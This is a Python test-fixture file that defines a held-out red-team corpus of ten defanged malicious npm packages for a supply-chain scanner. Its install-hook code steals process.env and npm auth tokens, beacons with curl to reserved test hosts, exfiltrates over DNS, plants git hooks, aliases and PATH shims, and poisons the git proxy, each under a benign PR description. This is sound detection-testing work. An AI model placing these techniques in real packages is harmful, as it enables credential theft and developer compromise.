"""Held-out ("blind") red-team corpus for PR Detonator.

This set was written WITHOUT reading the detectors (brain/rules.py, brain/intent.py,
brain/verdict.py, brain/evidence.py, brain/sbom.py, any prompt file, or the existing
eval/REDTEAM*/results*/SWEEP* material). That blindness is the whole point: its value is
measuring what the tool MISSES, so a miss is the useful result, not a failure.

Safety envelope (identical to eval/cases.py, enforced by audit, not luck): every destination
is reserved and non-routable, so nothing is ever exfiltrated.
  - IPs only from 203.0.113.0/24 (TEST-NET-3), 198.51.100.0/24 (TEST-NET-2),
    192.0.2.0/24 (TEST-NET-1).
  - Hostnames only ending in .invalid (never resolve) or example.com (dummy body).
  - File writes land in the sandbox's ephemeral tmpfs / the throwaway install tree only.
No real IPs, no real domains, no real credentials, no exfil endpoint that routes anywhere,
and no obfuscation whose purpose is evading a real-world scanner. These are detection probes.

Each case is a defanged npm package whose install-time behavior a reasonable supply-chain
scanner should notice. Cases are chosen for behavioral diversity across install-time
techniques, weighted toward ones a rule-based scanner might plausibly miss: staged/multi-step
behavior split across lifecycle hooks, data staged to disk instead of sent (dead drops),
persistence in unusual locations, indirection through legitimate tools (git, PATH), and
timing/conditional gating.
"""

from eval.cases import Case, _node_payload, _pkg

# -- bc01: second stage is generated at install time, so it never appears in the PR diff. ----
# A reader of the committed files sees "write a file" + "run a file" but not the destination,
# which only exists after preinstall has run. The egress lives in preinstall's output.
_BC01_STAGE = r"""
const fs = require("fs"), path = require("path");
// Write the real payload at install time; it is absent from the reviewed diff.
const stage2 = [
  'const https = require("https");',
  'const r = https.request({ host: "203.0.113.11", method: "POST", path: "/i", timeout: 3000 });',
  'r.on("error", () => {}); r.on("timeout", () => r.destroy());',
  'r.end(JSON.stringify(process.env));',
].join("\n");
try { fs.writeFileSync(path.join(__dirname, "stage2.js"), stage2); } catch {}
"""

_BC01_RUN = r"""
const path = require("path");
// Execute whatever preinstall dropped next to us.
try { require(path.join(__dirname, "stage2.js")); } catch {}
"""

# -- bc02: dead drop. Collect secrets, write them to disk, send nothing (no egress at all). ---
_BC02 = r"""
const fs = require("fs"), os = require("os"), path = require("path");
const loot = { env: process.env };
try { loot.npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8"); } catch {}
// No network: stage the loot in a cache-looking file for a later, separate pickup.
const dir = path.join(process.cwd(), "node_modules", ".cache");
try {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, ".telemetry.json"), JSON.stringify(loot));
} catch {}
"""

# -- bc03: persistence by writing an executable git hook that beacons on a later checkout. ----
_BC03 = r"""
const fs = require("fs"), path = require("path");
// Install-time write of a hook that fires later, on the next `git checkout`, not now.
const hook = path.resolve(process.cwd(), "..", "..", "..", ".git", "hooks", "post-checkout");
const body = "#!/bin/sh\ncurl -s -m 3 http://198.51.100.20/b >/dev/null 2>&1 &\n";
try { fs.writeFileSync(hook, body, { mode: 0o755 }); } catch {}
"""

# -- bc05: detached child beacons only after npm install has already returned. ----------------
_BC05 = r"""
const { fork } = require("child_process");
if (process.argv[2] === "beacon") {
  // Runs after the parent (and npm install) has exited the trace window.
  setTimeout(() => {
    const s = require("net").connect(443, "203.0.113.40");
    s.setTimeout(3000, () => s.destroy());
    s.on("error", () => {});
  }, 6000);
} else {
  const c = fork(__filename, ["beacon"], { detached: true, stdio: "ignore" });
  c.unref();
}
"""

# -- bc06: environment-conditional gating -- only on Linux CI, never on a developer laptop. ---
_BC06 = r"""
const net = require("net");
// Target automated Linux runners; stay dormant on macOS/Windows dev machines to dodge notice.
if (process.platform === "linux") {
  const s = net.connect(443, "198.51.100.50");
  s.setTimeout(3000, () => s.destroy());
  s.on("error", () => {});
}
"""

# -- bc07: harvest the npm auth token specifically, base64 it, stage it as a cache file. ------
_BC07 = r"""
const fs = require("fs"), os = require("os"), path = require("path");
let token = "";
try {
  const rc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
  const m = rc.match(/_authToken=(.*)/);
  if (m) token = m[1].trim();
} catch {}
const blob = Buffer.from(token).toString("base64");
// Park it under a cache-looking name; no egress here, a later step would collect it.
try { fs.writeFileSync(path.join(os.tmpdir(), ".npm-cache-index"), blob); } catch {}
"""

# -- bc08: exfiltrate over DNS -- the data rides in a label of a name that never resolves. ----
_BC08 = r"""
const dns = require("dns"), os = require("os");
// The hostname is encoded into a DNS query; no HTTP request is ever made.
const label = Buffer.from(os.hostname()).toString("hex").slice(0, 48);
dns.lookup(label + ".collector.invalid", () => {});
"""

# -- bc09: PATH hijack -- drop a `git` shim that beacons, then prepend its dir to PATH. -------
_BC09 = r"""
const fs = require("fs"), os = require("os"), path = require("path");
const bin = path.join(os.homedir(), ".local", "bin");
const shim = '#!/bin/sh\n'
  + 'curl -s -m 3 http://beacon.example.com/p >/dev/null 2>&1\n'
  + 'exec /usr/bin/git "$@"\n';
try {
  fs.mkdirSync(bin, { recursive: true });
  fs.writeFileSync(path.join(bin, "git"), shim, { mode: 0o755 });
  fs.appendFileSync(path.join(os.homedir(), ".bashrc"), '\nexport PATH="' + bin + ':$PATH"\n');
} catch {}
"""

# -- bc10: poison the global git http proxy so later git traffic routes through the attacker. -
_BC10 = r"""
const { execSync } = require("child_process");
// Indirection through a trusted tool: future `git` HTTP traffic is quietly re-routed.
try {
  execSync("git config --global http.proxy http://192.0.2.70:8080", { timeout: 3000 });
} catch {}
"""


BLIND_CORPUS = (
    Case(
        "bc01-staged-hooks",
        "redteam-blind",
        "Add install telemetry",
        "Records anonymous install metrics across the preinstall and postinstall steps.",
        files={
            "package.json": _pkg(
                "bc01",
                {"preinstall": "node scripts/stage.js", "postinstall": "node scripts/run.js"},
            ),
            "scripts/stage.js": _BC01_STAGE.strip() + "\n",
            "scripts/run.js": _BC01_RUN.strip() + "\n",
        },
        note="staged multi-step: preinstall writes the egress script, postinstall runs it",
        truth={"decoded": ["203.0.113.11"]},
    ),
    Case(
        "bc02-dead-drop",
        "redteam-blind",
        "Cache install diagnostics",
        "Caches diagnostics locally so support can inspect them later.",
        files=_node_payload("bc02", _BC02),
        note="dead drop: harvests env and ~/.npmrc to node_modules/.cache, sends nothing",
    ),
    Case(
        "bc03-git-hook",
        "redteam-blind",
        "Add repository checkout hook",
        "Installs a git post-checkout hook to keep local state in sync.",
        files=_node_payload("bc03", _BC03),
        note="persistence: writes an executable .git/hooks/post-checkout that beacons later",
    ),
    Case(
        "bc04-git-alias",
        "redteam-blind",
        "Add a git stats shortcut",
        "Registers a convenient `git pull-stats` alias for the team.",
        files={
            "package.json": _pkg(
                "bc04",
                {
                    "postinstall": "git config --global alias.pull-stats "
                    "'!curl -s -m 3 http://192.0.2.30/s >/dev/null 2>&1' || true"
                },
            )
        },
        note="indirection: hides the egress inside a git alias that fires on later git use",
    ),
    Case(
        "bc05-delayed-beacon",
        "redteam-blind",
        "Warm the network cache",
        "Pre-warms a connection a few seconds after setup to speed first use.",
        files=_node_payload("bc05", _BC05),
        note="timing: detached child connects out 6s after npm install has already returned",
    ),
    Case(
        "bc06-platform-gate",
        "redteam-blind",
        "Enable CI-only reporting",
        "Reports build health, but only from Linux CI runners.",
        files=_node_payload("bc06", _BC06),
        note="conditional: egress gated on process.platform === 'linux' to skip dev machines",
    ),
    Case(
        "bc07-npm-token",
        "redteam-blind",
        "Speed up the npm cache",
        "Indexes the local npm cache for faster subsequent installs.",
        files=_node_payload("bc07", _BC07),
        note="secret harvest: reads _authToken from ~/.npmrc, base64s it, stages it to /tmp",
    ),
    Case(
        "bc08-dns-exfil",
        "redteam-blind",
        "Add DNS health probe",
        "Probes DNS resolution on install to catch broken resolvers early.",
        files=_node_payload("bc08", _BC08),
        note="DNS exfil: host identity hex-encoded into a label under a .invalid name",
        truth={"decoded": ["collector.invalid"]},
    ),
    Case(
        "bc09-path-shadow",
        "redteam-blind",
        "Add a local tool shim",
        "Adds a user-local bin shim so project tools resolve first.",
        files=_node_payload("bc09", _BC09),
        note="PATH hijack: drops a `git` shim that beacons, prepends ~/.local/bin via ~/.bashrc",
    ),
    Case(
        "bc10-git-proxy",
        "redteam-blind",
        "Configure a corporate git proxy",
        "Sets the git HTTP proxy so clones work behind the corporate gateway.",
        files=_node_payload("bc10", _BC10),
        note="config poison: sets global git http.proxy to a TEST-NET host (MITM of git traffic)",
    ),
)
